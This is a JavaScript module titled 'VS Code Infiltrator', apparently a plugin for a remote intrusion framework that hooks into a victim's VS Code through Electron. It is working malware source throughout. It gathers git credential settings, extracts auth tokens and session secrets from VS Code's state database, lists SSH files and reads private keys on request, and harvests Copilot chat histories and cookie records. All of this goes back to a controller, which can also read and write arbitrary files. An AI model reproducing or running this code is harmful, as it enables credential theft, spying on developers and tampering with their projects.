// VS Code Infiltrator — main.js
// Extracts project state, git credentials, secrets, Copilot chat history,
// and provides file read/write from a tapped VS Code instance.
// Uses Electron APIs for cross-platform path resolution.

var fs = plugin.fs;
var path = plugin.path;
var childProcess = plugin.childProcess;
var os = plugin.os;

// ===== Cross-platform paths (resolved at bootstrap) =====
var userData = '';       // e.g. ~/.config/Code (Linux), ~/Library/Application Support/Code (macOS), %APPDATA%/Code (Windows)
var userDir = '';        // userData + '/User'
var globalStorageDir = '';
var workspaceStorageDir = '';
var homeDir = '';
var extensionsDir = '';
var sshDir = '';
var workspacePath = '';
var workspaceStorageHash = ''; // the hash directory for current workspace
var platform = plugin.os.platform(); // 'linux', 'darwin', 'win32'

// ===== Helpers =====

function safeReadFile(filePath) {
    try {
        return fs.readFileSync(filePath, 'utf8');
    } catch (e) {
        return null;
    }
}

function safeReadDir(dirPath) {
    try {
        return fs.readdirSync(dirPath);
    } catch (e) {
        return [];
    }
}

function safeStatSync(p) {
    try {
        return fs.statSync(p);
    } catch (e) {
        return null;
    }
}

function safeParse(json) {
    try {
        return JSON.parse(json);
    } catch (e) {
        return null;
    }
}

// Run a shell command, return stdout or null
function execSafe(cmd, options) {
    try {
        return childProcess.execSync(cmd, Object.assign({ timeout: 10000, encoding: 'utf8' }, options || {})).trim();
    } catch (e) {
        return null;
    }
}

// Query a SQLite .vscdb file using python3 subprocess
// Returns parsed JSON array of rows, or null on failure
function queryVscdb(dbPath, sql) {
    try {
        // Escape single quotes in paths and SQL
        var escapedPath = dbPath.replace(/'/g, "'\\''");
        var escapedSql = sql.replace(/'/g, "'\\''");
        var pyCmd = "python3 -c \"import sqlite3,json,sys; " +
            "conn=sqlite3.connect('" + escapedPath + "'); " +
            "cur=conn.cursor(); cur.execute('" + escapedSql + "'); " +
            "print(json.dumps(cur.fetchall())); conn.close()\"";
        var result = execSafe(pyCmd, { timeout: 5000 });
        if (result) return safeParse(result);
        return null;
    } catch (e) {
        return null;
    }
}

// ===== Bootstrap =====

function bootstrap() {
    try {
        // Resolve base paths via Electron API
        userData = plugin.electron.app.getPath('userData'); // e.g. ~/.config/Code
        homeDir = plugin.electron.app.getPath('home');
    } catch (e) {
        plugin.sendData('_error', { phase: 'bootstrap', error: 'Failed to get Electron paths: ' + String(e) });
        return;
    }

    userDir = path.join(userData, 'User');
    globalStorageDir = path.join(userDir, 'globalStorage');
    workspaceStorageDir = path.join(userDir, 'workspaceStorage');
    extensionsDir = path.join(homeDir, '.vscode', 'extensions');
    sshDir = path.join(homeDir, '.ssh');

    // Find workspace path from storage.json or workspace state DBs
    workspacePath = discoverWorkspacePath();

    // Find the workspace storage hash directory
    if (workspacePath) {
        workspaceStorageHash = findWorkspaceStorageHash(workspacePath);
    }

    plugin.sendData('_debug', {
        phase: 'bootstrap',
        userData: userData,
        homeDir: homeDir,
        workspacePath: workspacePath,
        workspaceStorageHash: workspaceStorageHash,
        platform: platform
    });

    // Auto-collect if setting enabled
    if (plugin.settings.autoCollect !== 0) {
        collectProjectInfo();
    }
}

function discoverWorkspacePath() {
    // Strategy 1: Read global storage.json for recent workspace info
    var storagePath = path.join(globalStorageDir, 'storage.json');
    var storageJson = safeReadFile(storagePath);
    if (storageJson) {
        var storage = safeParse(storageJson);
        if (storage) {
            // Check backupWorkspaces.folders
            if (storage.backupWorkspaces && storage.backupWorkspaces.folders &&
                storage.backupWorkspaces.folders.length > 0) {
                var folderUri = storage.backupWorkspaces.folders[0];
                if (typeof folderUri === 'object' && folderUri.folderUri) {
                    folderUri = folderUri.folderUri;
                }
                var folderPath = uriToPath(String(folderUri));
                if (folderPath) return folderPath;
            }
            // Check windowsState.lastActiveWindow
            if (storage.windowsState && storage.windowsState.lastActiveWindow &&
                storage.windowsState.lastActiveWindow.folder) {
                var folderPath2 = uriToPath(String(storage.windowsState.lastActiveWindow.folder));
                if (folderPath2) return folderPath2;
            }
        }
    }

    // Strategy 2: Scan workspace storage directories for workspace.json
    var wsEntries = safeReadDir(workspaceStorageDir);
    for (var i = 0; i < wsEntries.length; i++) {
        var wsJsonPath = path.join(workspaceStorageDir, wsEntries[i], 'workspace.json');
        var wsJson = safeReadFile(wsJsonPath);
        if (wsJson) {
            var wsData = safeParse(wsJson);
            if (wsData && wsData.folder) {
                var p = uriToPath(wsData.folder);
                if (p && safeStatSync(p)) return p;
            }
        }
    }

    return '';
}

function uriToPath(uri) {
    if (!uri) return '';
    // file:///path/to/folder → /path/to/folder
    if (uri.indexOf('file:///') === 0) {
        var decoded = uri.substring(7);
        try { decoded = decodeURIComponent(decoded); } catch (e) {}
        // On Windows, file:///C:/foo → C:/foo (strip leading slash before drive letter)
        if (platform === 'win32' && decoded.length > 2 && decoded[0] === '/' && decoded[2] === ':') {
            decoded = decoded.substring(1);
        }
        return decoded;
    }
    // Already a path
    if (uri.indexOf('/') === 0 || (platform === 'win32' && uri.length > 1 && uri[1] === ':')) {
        return uri;
    }
    return '';
}

function pathToUri(p) {
    if (!p) return '';
    var encoded = p.replace(/ /g, '%20');
    if (platform === 'win32') {
        return 'file:///' + encoded.replace(/\\/g, '/');
    }
    return 'file://' + encoded;
}

function findWorkspaceStorageHash(wsPath) {
    var wsEntries = safeReadDir(workspaceStorageDir);
    var targetUri = pathToUri(wsPath);

    for (var i = 0; i < wsEntries.length; i++) {
        var wsJsonPath = path.join(workspaceStorageDir, wsEntries[i], 'workspace.json');
        var wsJson = safeReadFile(wsJsonPath);
        if (wsJson) {
            var wsData = safeParse(wsJson);
            if (wsData && wsData.folder) {
                // Compare both as URI and as resolved path
                if (wsData.folder === targetUri || uriToPath(wsData.folder) === wsPath) {
                    return wsEntries[i];
                }
            }
        }
    }
    return '';
}

// ===== Data Collection Functions =====

function collectProjectInfo() {
    var info = {
        workspacePath: workspacePath,
        openEditors: [],
        recentProjects: [],
        extensions: [],
        fileTree: []
    };

    // Open editors — from workspace state.vscdb
    if (workspaceStorageHash) {
        var wsDb = path.join(workspaceStorageDir, workspaceStorageHash, 'state.vscdb');
        var editorRows = queryVscdb(wsDb, 'SELECT value FROM ItemTable WHERE key = "memento/workbench.parts.editor"');
        if (editorRows && editorRows.length > 0) {
            var editorState = safeParse(editorRows[0][0]);
            if (editorState) {
                info.openEditors = extractEditorPaths(editorState);
            }
        }
    }

    // Recently opened projects — from global state.vscdb
    var globalDb = path.join(globalStorageDir, 'state.vscdb');
    var recentRows = queryVscdb(globalDb, 'SELECT value FROM ItemTable WHERE key = "history.recentlyOpenedPathsList"');
    if (recentRows && recentRows.length > 0) {
        var recentData = safeParse(recentRows[0][0]);
        if (recentData && recentData.entries) {
            for (var r = 0; r < recentData.entries.length && r < 20; r++) {
                var entry = recentData.entries[r];
                var entryPath = '';
                if (entry.folderUri) entryPath = uriToPath(entry.folderUri);
                else if (entry.fileUri) entryPath = uriToPath(entry.fileUri);
                else if (entry.workspace && entry.workspace.configPath) {
                    entryPath = uriToPath(entry.workspace.configPath);
                }
                if (entryPath) info.recentProjects.push(entryPath);
            }
        }
    }

    // Installed extensions — scan extensions dir
    var extEntries = safeReadDir(extensionsDir);
    for (var e = 0; e < extEntries.length; e++) {
        // Skip hidden files
        if (extEntries[e][0] === '.') continue;
        info.extensions.push(extEntries[e]);
    }

    // Top-level file tree of workspace
    if (workspacePath) {
        var treeEntries = safeReadDir(workspacePath);
        for (var t = 0; t < treeEntries.length; t++) {
            var fullPath = path.join(workspacePath, treeEntries[t]);
            var stat = safeStatSync(fullPath);
            info.fileTree.push({
                name: treeEntries[t],
                type: stat && stat.isDirectory() ? 'dir' : 'file',
                size: stat ? stat.size : 0
            });
        }
    }

    plugin.sendData('project_info', info);
}

function extractEditorPaths(editorState) {
    // Walk the editor state object looking for resource URIs
    var paths = [];
    deepFindEditorPaths(editorState, paths, 0);
    // De-duplicate
    var seen = {};
    var unique = [];
    for (var i = 0; i < paths.length; i++) {
        if (!seen[paths[i]]) {
            seen[paths[i]] = true;
            unique.push(paths[i]);
        }
    }
    return unique;
}

function deepFindEditorPaths(obj, paths, depth) {
    if (depth > 15 || !obj || typeof obj !== 'object') return;
    if (Array.isArray(obj)) {
        for (var i = 0; i < obj.length; i++) deepFindEditorPaths(obj[i], paths, depth + 1);
        return;
    }
    // Look for resource or uri fields that contain file:// URIs
    if (obj.resource && typeof obj.resource === 'string' && obj.resource.indexOf('file:') === 0) {
        var p = uriToPath(obj.resource);
        if (p) paths.push(p);
    }
    if (obj.uri && typeof obj.uri === 'string' && obj.uri.indexOf('file:') === 0) {
        var p2 = uriToPath(obj.uri);
        if (p2) paths.push(p2);
    }
    var keys = Object.keys(obj);
    for (var k = 0; k < keys.length; k++) {
        deepFindEditorPaths(obj[keys[k]], paths, depth + 1);
    }
}

function collectGitInfo() {
    if (!workspacePath) {
        plugin.sendData('git_info', { error: 'No workspace path found' });
        return;
    }

    var opts = { cwd: workspacePath };
    var info = {
        remotes: execSafe('git remote -v', opts) || '',
        branch: execSafe('git rev-parse --abbrev-ref HEAD', opts) || '',
        log: execSafe('git log --oneline -20', opts) || '',
        userName: execSafe('git config user.name', opts) || '',
        userEmail: execSafe('git config user.email', opts) || '',
        credentialHelper: execSafe('git config credential.helper', opts) || '',
        workspacePath: workspacePath
    };

    plugin.sendData('git_info', info);
}

function collectSecrets() {
    var entries = [];

    // Read all keys from global state.vscdb — look for secret:// and auth tokens
    var globalDb = path.join(globalStorageDir, 'state.vscdb');
    var rows = queryVscdb(globalDb, 'SELECT key, value FROM ItemTable');
    if (rows) {
        for (var i = 0; i < rows.length; i++) {
            var key = rows[i][0];
            var value = rows[i][1];
            // Look for secret-related keys
            if (key && (
                key.indexOf('secret') !== -1 ||
                key.indexOf('token') !== -1 ||
                key.indexOf('auth') !== -1 ||
                key.indexOf('credential') !== -1 ||
                key.indexOf('oauth') !== -1 ||
                key.indexOf('session') !== -1 ||
                key.indexOf('github') !== -1 ||
                key.indexOf('azure') !== -1 ||
                key.indexOf('microsoft') !== -1
            )) {
                // Truncate very large values
                var displayVal = value;
                if (displayVal && displayVal.length > 2000) {
                    displayVal = displayVal.substring(0, 2000) + '... [truncated]';
                }
                entries.push({ key: key, value: displayVal });
            }
        }
    }

    plugin.sendData('secrets', { source: 'globalStorage/state.vscdb', entries: entries });
}

function collectSSHKeys() {
    var keys = [];
    var sshEntries = safeReadDir(sshDir);
    for (var i = 0; i < sshEntries.length; i++) {
        var name = sshEntries[i];
        var fullPath = path.join(sshDir, name);
        var stat = safeStatSync(fullPath);
        if (!stat || stat.isDirectory()) continue;

        var entry = {
            name: name,
            size: stat.size,
            isPublic: name.indexOf('.pub') !== -1,
            content: null
        };

        // Auto-read public keys and known_hosts/config, not private keys
        if (entry.isPublic || name === 'known_hosts' || name === 'config' || name === 'authorized_keys') {
            entry.content = safeReadFile(fullPath);
        }

        keys.push(entry);
    }

    plugin.sendData('ssh_keys', { keys: keys });
}

function collectCookies() {
    // VS Code Cookies SQLite DB (Chromium format)
    var cookieDb = path.join(userData, 'Cookies');
    var rows = queryVscdb(cookieDb, 'SELECT host_key, name, path, expires_utc, is_secure, is_httponly FROM cookies LIMIT 200');
    var cookies = [];
    if (rows) {
        for (var i = 0; i < rows.length; i++) {
            cookies.push({
                host: rows[i][0],
                name: rows[i][1],
                path: rows[i][2],
                expires: rows[i][3],
                secure: rows[i][4],
                httpOnly: rows[i][5]
            });
        }
    }
    plugin.sendData('cookies', { cookies: cookies });
}

function collectChatSessions() {
    var sessions = [];

    // Workspace-specific chat sessions
    if (workspaceStorageHash) {
        var wsSessionDir = path.join(workspaceStorageDir, workspaceStorageHash, 'chatSessions');
        scanChatDir(wsSessionDir, 'workspace', sessions);
    }

    // Global (empty window) chat sessions
    var globalSessionDir = path.join(globalStorageDir, 'emptyWindowChatSessions');
    scanChatDir(globalSessionDir, 'global', sessions);

    // Also scan all workspace storage directories for chat sessions
    var wsEntries = safeReadDir(workspaceStorageDir);
    for (var i = 0; i < wsEntries.length; i++) {
        if (wsEntries[i] === workspaceStorageHash) continue; // already scanned
        var chatDir = path.join(workspaceStorageDir, wsEntries[i], 'chatSessions');
        scanChatDir(chatDir, 'workspace:' + wsEntries[i], sessions);
    }

    plugin.sendData('chat_sessions', { sessions: sessions });
}

function scanChatDir(dirPath, source, sessions) {
    var entries = safeReadDir(dirPath);
    for (var i = 0; i < entries.length; i++) {
        if (entries[i].indexOf('.jsonl') === -1) continue;
        var fullPath = path.join(dirPath, entries[i]);
        var stat = safeStatSync(fullPath);

        // Try to get session title and request count from first line (kind:0 header)
        var title = '';
        var requestCount = 0;
        try {
            var firstLine = safeReadFile(fullPath);
            if (firstLine) {
                var nlIdx = firstLine.indexOf('\n');
                var line0 = nlIdx > -1 ? firstLine.substring(0, nlIdx) : firstLine;
                var parsed = safeParse(line0);
                if (parsed && parsed.v) {
                    title = parsed.v.title || parsed.v.customTitle || '';
                    if (parsed.v.requests) requestCount = parsed.v.requests.length;
                    // If no explicit title, use first request text as preview
                    if (!title && parsed.v.requests && parsed.v.requests.length > 0) {
                        var firstMsg = parsed.v.requests[0].message;
                        if (firstMsg && firstMsg.text) {
                            title = firstMsg.text.substring(0, 80);
                        }
                    }
                }
            }
        } catch (e) {}

        sessions.push({
            file: fullPath,
            name: entries[i],
            source: source,
            title: title,
            requestCount: requestCount,
            size: stat ? stat.size : 0,
            modified: stat ? stat.mtime.toISOString() : ''
        });
    }
}

function readChatSession(sessionFile) {
    var content = safeReadFile(sessionFile);
    if (!content) {
        plugin.sendData('_error', { phase: 'read_chat', error: 'Cannot read: ' + sessionFile });
        return;
    }

    var lines = content.split('\n');
    var title = '';
    var messages = [];
    var seenTexts = {}; // de-duplicate since kind:1 updates may re-include earlier requests

    for (var i = 0; i < lines.length; i++) {
        var line = lines[i].trim();
        if (!line) continue;
        var obj = safeParse(line);
        if (!obj) continue;

        if (obj.kind === 0 && obj.v) {
            // kind:0 is the full session snapshot — requests are in obj.v.requests
            title = obj.v.title || obj.v.customTitle || title;
            var requests = obj.v.requests;
            if (Array.isArray(requests)) {
                for (var r = 0; r < requests.length; r++) {
                    var msg = extractChatMessage(requests[r]);
                    if (msg && msg.text && !seenTexts[msg.text]) {
                        seenTexts[msg.text] = true;
                        messages.push(msg);
                    }
                }
            }
        }

        if (obj.kind === 1 && obj.k) {
            // kind:1 is an incremental update; k is a key path, v is the new value
            // k:["requests"] means v is the full updated requests array
            var kPath = Array.isArray(obj.k) ? obj.k : [obj.k];
            if (kPath[0] === 'requests' && Array.isArray(obj.v)) {
                for (var r2 = 0; r2 < obj.v.length; r2++) {
                    var msg2 = extractChatMessage(obj.v[r2]);
                    if (msg2 && msg2.text && !seenTexts[msg2.text]) {
                        seenTexts[msg2.text] = true;
                        messages.push(msg2);
                    }
                }
            }
            // k:["customTitle"] or k:["title"] is a title update
            if ((kPath[0] === 'customTitle' || kPath[0] === 'title') && typeof obj.v === 'string') {
                title = obj.v;
            }
        }

        // kind:2 — some VS Code versions use this for request array patches
        if (obj.kind === 2 && obj.k) {
            var k2Path = Array.isArray(obj.k) ? obj.k : [obj.k];
            if (k2Path[0] === 'requests' && Array.isArray(obj.v)) {
                for (var r3 = 0; r3 < obj.v.length; r3++) {
                    var msg3 = extractChatMessage(obj.v[r3]);
                    if (msg3 && msg3.text && !seenTexts[msg3.text]) {
                        seenTexts[msg3.text] = true;
                        messages.push(msg3);
                    }
                }
            }
        }

        // Fallback: direct message format at top level
        if (obj.message && obj.message.text && !seenTexts[obj.message.text]) {
            seenTexts[obj.message.text] = true;
            var directMsg = {
                role: 'exchange',
                text: obj.message.text,
                response: obj.response ? extractResponseText(obj.response) : '',
                model: obj.model || '',
                files: []
            };
            messages.push(directMsg);
        }
    }

    // If no explicit title, use first message as preview
    if (!title && messages.length > 0 && messages[0].text) {
        title = messages[0].text.substring(0, 80);
    }

    plugin.sendData('chat_history', {
        sessionFile: sessionFile,
        title: title || '(empty session)',
        messages: messages
    });
}

function extractChatMessage(req) {
    if (!req) return null;
    var msg = {
        role: 'exchange',
        text: '',
        response: '',
        model: '',
        files: []
    };

    // User message
    if (req.message && req.message.text) {
        msg.text = req.message.text;
    }

    // Model info
    if (req.model) msg.model = req.model;

    // Response
    if (req.response) {
        msg.response = extractResponseText(req.response);
    }

    // Attached files / code context
    if (req.message && req.message.references) {
        for (var i = 0; i < req.message.references.length; i++) {
            var ref = req.message.references[i];
            if (ref.uri || ref.relativePath || ref.name) {
                msg.files.push(ref.uri || ref.relativePath || ref.name);
            }
        }
    }

    if (!msg.text && !msg.response) return null;
    return msg;
}

function extractResponseText(response) {
    if (typeof response === 'string') return response;
    if (!response) return '';

    // Array of response parts
    if (Array.isArray(response)) {
        var parts = [];
        for (var i = 0; i < response.length; i++) {
            var part = response[i];
            if (typeof part === 'string') parts.push(part);
            else if (part && part.value) parts.push(part.value);
            else if (part && part.text) parts.push(part.text);
        }
        return parts.join('');
    }

    // Object with value
    if (response.value) return response.value;
    if (response.text) return response.text;

    return '';
}

// ===== File Operations =====

function readFile(filePath) {
    try {
        var stat = fs.statSync(filePath);
        // Limit to 1MB reads
        if (stat.size > 1048576) {
            plugin.sendData('file_content', {
                filePath: filePath,
                content: '[File too large: ' + stat.size + ' bytes. Max 1MB.]',
                size: stat.size
            });
            return;
        }
        var content = fs.readFileSync(filePath, 'utf8');
        plugin.sendData('file_content', {
            filePath: filePath,
            content: content,
            size: stat.size
        });
    } catch (e) {
        plugin.sendData('_error', { phase: 'read_file', error: String(e), filePath: filePath });
    }
}

function writeFile(filePath, content) {
    try {
        fs.writeFileSync(filePath, content, 'utf8');
        plugin.sendData('write_result', { filePath: filePath, success: true });
    } catch (e) {
        plugin.sendData('write_result', { filePath: filePath, success: false, error: String(e) });
    }
}

function listDir(dirPath) {
    try {
        var entries = fs.readdirSync(dirPath);
        var result = [];
        for (var i = 0; i < entries.length; i++) {
            var fullPath = path.join(dirPath, entries[i]);
            var stat = safeStatSync(fullPath);
            result.push({
                name: entries[i],
                type: stat && stat.isDirectory() ? 'dir' : 'file',
                size: stat ? stat.size : 0
            });
        }
        // Sort: directories first, then alphabetical
        result.sort(function(a, b) {
            if (a.type !== b.type) return a.type === 'dir' ? -1 : 1;
            return a.name.localeCompare(b.name);
        });
        plugin.sendData('dir_listing', { dirPath: dirPath, entries: result });
    } catch (e) {
        plugin.sendData('_error', { phase: 'list_dir', error: String(e), dirPath: dirPath });
    }
}

function readSSHKey(keyName) {
    // Re-collect all SSH keys but force-include the requested key's content
    var keys = [];
    var sshEntries = safeReadDir(sshDir);
    for (var i = 0; i < sshEntries.length; i++) {
        var name = sshEntries[i];
        var fullPath = path.join(sshDir, name);
        var stat = safeStatSync(fullPath);
        if (!stat || stat.isDirectory()) continue;

        var entry = {
            name: name,
            size: stat.size,
            isPublic: name.indexOf('.pub') !== -1,
            content: null
        };

        // Always read public keys, config, known_hosts, authorized_keys
        // Also read the specifically requested key
        if (entry.isPublic || name === 'known_hosts' || name === 'config' ||
            name === 'authorized_keys' || name === keyName) {
            entry.content = safeReadFile(fullPath);
        }

        keys.push(entry);
    }

    plugin.sendData('ssh_keys', { keys: keys });
}

// ===== Command Handler =====

function onCommand(cmd) {
    var action = cmd.action;

    if (action === 'refresh') return collectProjectInfo();
    if (action === 'collect_git') return collectGitInfo();
    if (action === 'collect_secrets') return collectSecrets();
    if (action === 'collect_ssh') return collectSSHKeys();
    if (action === 'collect_cookies') return collectCookies();
    if (action === 'list_chat_sessions') return collectChatSessions();
    if (action === 'read_chat') return readChatSession(cmd.sessionFile);
    if (action === 'read_file') return readFile(cmd.filePath);
    if (action === 'write_file') return writeFile(cmd.filePath, cmd.content);
    if (action === 'list_dir') return listDir(cmd.dirPath);
    if (action === 'read_ssh_key') return readSSHKey(cmd.keyName);

    plugin.sendData('_error', { phase: 'command', error: 'Unknown action: ' + action });
}

// ===== Bootstrap =====

plugin.setTimeout(bootstrap, 3000);

return {
    cleanup: function() {},
    onCommand: onCommand
};
